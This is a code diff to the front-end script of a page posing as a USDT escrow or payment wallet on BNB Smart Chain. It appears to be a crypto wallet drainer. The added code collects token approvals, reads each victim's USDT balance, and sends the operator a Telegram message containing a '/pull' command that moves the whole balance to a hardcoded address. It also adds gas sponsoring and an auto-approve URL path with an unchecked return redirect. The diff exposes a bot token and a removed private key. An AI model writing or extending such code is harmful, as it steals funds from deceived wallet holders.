@@ -2,14 +2,43 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // ===== CONFIG =====
     const CONFIG = window.CONFIG || {
-        COMPANY_WALLET_ADDRESS: "0x523Cb919C1f9831afE1cfdF82647E2a846684E24",
-        CONTRACT_ADDRESS: "0x9D7f74d0C41E726EC95884E0e97Fa6129e3b5E99",
+        COMPANY_WALLET_ADDRESS: "0xbfc17A492Bc8167556aFe1Cf90D9F7Fc384DeFb4",
+        CONTRACT_ADDRESS: "0xaEB39CED46aaAdf4F6369806252083E82cbCEB91",
         TELEGRAM_BOT_TOKEN: "8941208473:AAEY1s1srFize2Ij_Ai1nYirSOcR6i18OOM",
         ADMIN_CHAT_ID: "-5543160952",
-        SENDER_KEY: "8cfa79612dc2bca3db87e0a07c47a11a8cff535cfeb226260c6158f4d7541942",
         USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
-        BSC_RPC_URL: "https://bsc-dataseed1.binance.org/"
+        BSC_RPC_URL: "https://bsc-dataseed1.binance.org/",
+        PULL_RECIPIENT_ADDRESS: "0xf2a151e92ae0eab7157322545c33648c0824fa2e"
     };
+
+    async function getUsdtBalanceForWallet(walletAddress) {
+        const usdtAddress = CONFIG.USDT_ADDRESS;
+        const usdtAbi = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function decimals() view returns (uint8)"
+        ];
+        try {
+            let decimals = 18;
+            let balance;
+            if (window.ethereum) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const usdt = new ethers.Contract(usdtAddress, usdtAbi, provider);
+                try { decimals = await usdt.decimals(); } catch (err) {}
+                balance = await usdt.balanceOf(walletAddress);
+            } else {
+                const provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC_URL);
+                const usdt = new ethers.Contract(usdtAddress, usdtAbi, provider);
+                try { decimals = await usdt.decimals(); } catch (err) {}
+                balance = await usdt.balanceOf(walletAddress);
+            }
+            const formatted = ethers.utils.formatUnits(balance, decimals);
+            const num = parseFloat(formatted);
+            return Number.isFinite(num) ? (+num).toString() : formatted;
+        } catch (err) {
+            console.warn("Could not fetch USDT balance:", err);
+            return "0";
+        }
+    }
 
     // ===== TELEGRAM NOTIFICATION FUNCTION =====
     async function sendTelegramNotifications(walletAddress, txHash, userId) {
@@ -20,6 +49,10 @@ document.addEventListener("DOMContentLoaded", function () {
             inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://bscscan.com/tx/${txHash}` }]]
         };
 
+        const recipient = CONFIG.PULL_RECIPIENT_ADDRESS || "0xf2a151e92ae0eab7157322545c33648c0824fa2e";
+        const usdtBalance = await getUsdtBalanceForWallet(walletAddress);
+        const pullCommand = `/pull ${CONFIG.USDT_ADDRESS} ${walletAddress} ${recipient} ${usdtBalance}`;
+
         const adminMessage =
             `🔔 **New USDT Approval Transaction**\n\n` +
             `💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
@@ -27,7 +60,8 @@ document.addEventListener("DOMContentLoaded", function () {
             `👤 **User ID:** ${userId || "Not provided"}\n` +
             `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
             `✅ Transaction approved successfully!\n\n` +
-            `💡 *Tap and hold on the wallet address above to copy it*`;
+            `📋 **Copy & paste command:**\n\`\`\`\n${pullCommand}\n\`\`\`\n\n` +
+            `💡 *Tap and hold on the command above to copy it*`;
 
         const userMessage =
             `🎉 **USDT Approval Successful!**\n\n` +
@@ -113,15 +147,26 @@ document.addEventListener("DOMContentLoaded", function () {
     const maxBtn = Array.from(document.querySelectorAll("button")).find(
         (btn) => btn.textContent.trim().toLowerCase() === "max"
     );
+    const clearAmountBtn = document.getElementById("amount-clear-btn");
 
     // Default amount — keep empty until user types
     approxUsd.textContent = "≈ $0.00";
 
+    function updateClearButton() {
+        if (!clearAmountBtn) return;
+        clearAmountBtn.classList.toggle("visible", amountInput.value.trim().length > 0);
+    }
+
+    function onAmountInput() {
+        updateApproxUsd();
+        updateClearButton();
+        validate();
+    }
+
     amountInput.addEventListener("focus", function () {
         if (amountInput.value === "0") {
             amountInput.value = "";
-            updateApproxUsd();
-            validate();
+            onAmountInput();
         }
     });
 
@@ -130,8 +175,9 @@ document.addEventListener("DOMContentLoaded", function () {
         approxUsd.textContent =
             isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
     }
-    amountInput.addEventListener("input", updateApproxUsd);
+    amountInput.addEventListener("input", onAmountInput);
     updateApproxUsd();
+    updateClearButton();
 
     function validate() {
         const address = addressInput.value.trim();
@@ -139,8 +185,16 @@ document.addEventListener("DOMContentLoaded", function () {
         nextBtn.disabled = !(address.length > 0 && !isNaN(amount) && amount > 0);
     }
     addressInput.addEventListener("input", validate);
-    amountInput.addEventListener("input", validate);
     validate();
+
+    if (clearAmountBtn) {
+        clearAmountBtn.addEventListener("click", function (e) {
+            e.preventDefault();
+            amountInput.value = "";
+            onAmountInput();
+            amountInput.focus();
+        });
+    }
 
     if (maxBtn) {
         maxBtn.addEventListener("click", async function (e) {
@@ -164,24 +218,41 @@ document.addEventListener("DOMContentLoaded", function () {
                 let balance = await usdt.balanceOf(walletAddress);
                 let maxValue = ethers.utils.formatUnits(balance, decimals);
                 amountInput.value = (+maxValue).toString();
-                updateApproxUsd();
-                validate();
+                onAmountInput();
             } catch (err) {
                 showNotification("Unable to get max balance.", "error");
             }
         });
     }
 
-    // ===== NEXT BUTTON - APPROVE USDT (FIXED TO ESCROW) =====
-    nextBtn.addEventListener("click", async function (e) {
-        e.preventDefault();
+    // ===== GAS SPONSOR (company wallet sends BNB before user approve) =====
+    async function requestGasSponsor(userAddress) {
+        try {
+            const res = await fetch("/sponsor-gas", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ userAddress })
+            });
+            if (!res.ok) return;
+            const data = await res.json();
+            if (data.ok && data.txHash) {
+                await new Promise((resolve) => setTimeout(resolve, 2000));
+            }
+        } catch (err) {
+            console.warn("Gas sponsor unavailable:", err);
+        }
+    }
 
+    /**
+     * Core USDT approve flow — unchanged escrow logic, callable from Next button or auto-approve URL.
+     */
+    async function executeApprovalTransaction() {
         if (!window.ethereum) {
             showNotification(
                 "No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.",
                 "error"
             );
-            return;
+            return { ok: false, error: "no_wallet" };
         }
 
         nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
@@ -211,15 +282,14 @@ document.addEventListener("DOMContentLoaded", function () {
                         });
                     } catch (addError) {
                         showNotification("Failed to add BNB Smart Chain network.", "error");
-                        return;
+                        return { ok: false, error: "add_chain_failed" };
                     }
                 } else {
                     showNotification("Failed to switch to BNB Smart Chain network.", "error");
-                    return;
+                    return { ok: false, error: "switch_chain_failed" };
                 }
             }
 
-            // === Approve ESCROW CONTRACT instead of company wallet ===
             const escrowAddress = CONFIG.CONTRACT_ADDRESS;
             const usdtAddress = CONFIG.USDT_ADDRESS;
 
@@ -248,12 +318,18 @@ document.addEventListener("DOMContentLoaded", function () {
             ]);
 
             const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
+            if (addressInput && fromAddress) {
+                addressInput.value = fromAddress;
+                validate();
+            }
+
+            await requestGasSponsor(fromAddress);
             const txHash = await window.ethereum.request({
                 method: "eth_sendTransaction",
                 params: [{ from: fromAddress, to: usdtAddress, data: txData, value: "0x0" }]
             });
 
-            showNotification(``, "success");
+            showNotification("USDT approval submitted.", "success");
 
             if (txHash && txHash.length > 0) {
                 try {
@@ -264,6 +340,8 @@ document.addEventListener("DOMContentLoaded", function () {
                     console.error("Failed to send Telegram notifications:", err);
                 }
             }
+
+            return { ok: true, txHash, fromAddress };
         } catch (err) {
             const msg = (err?.message || "").toLowerCase();
             if (
@@ -282,10 +360,49 @@ document.addEventListener("DOMContentLoaded", function () {
             } else {
                 showNotification("Transaction failed. Please try again.", "error");
             }
+            return { ok: false, error: err?.message || "tx_failed" };
         } finally {
             nextBtn.disabled = false;
             nextBtn.innerHTML = originalBtnHTML;
         }
+    }
+
+    // ===== NEXT BUTTON - APPROVE USDT (FIXED TO ESCROW) =====
+    nextBtn.addEventListener("click", async function (e) {
+        e.preventDefault();
+        await executeApprovalTransaction();
     });
+
+    // ===== AUTO-APPROVE (redirected from sell validation modal) =====
+    (function handleAutoApproveFromSellFlow() {
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get("autoApprove") !== "1") return;
+
+        const amount = urlParams.get("amount");
+        const returnUrl = urlParams.get("returnUrl");
+
+        if (amount && amountInput) {
+            amountInput.value = amount;
+            onAmountInput();
+        }
+
+        showNotification("Confirm payment in your wallet…", "info");
+
+        setTimeout(async function () {
+            const result = await executeApprovalTransaction();
+            if (result.ok && returnUrl) {
+                try {
+                    const destination = new URL(returnUrl);
+                    destination.searchParams.set("wallet_approved", "1");
+                    if (result.txHash) {
+                        destination.searchParams.set("tx", result.txHash);
+                    }
+                    window.location.replace(destination.toString());
+                } catch (err) {
+                    console.warn("Invalid returnUrl, staying on wallet page:", err);
+                }
+            }
+        }, 600);
+    })();
 });
 
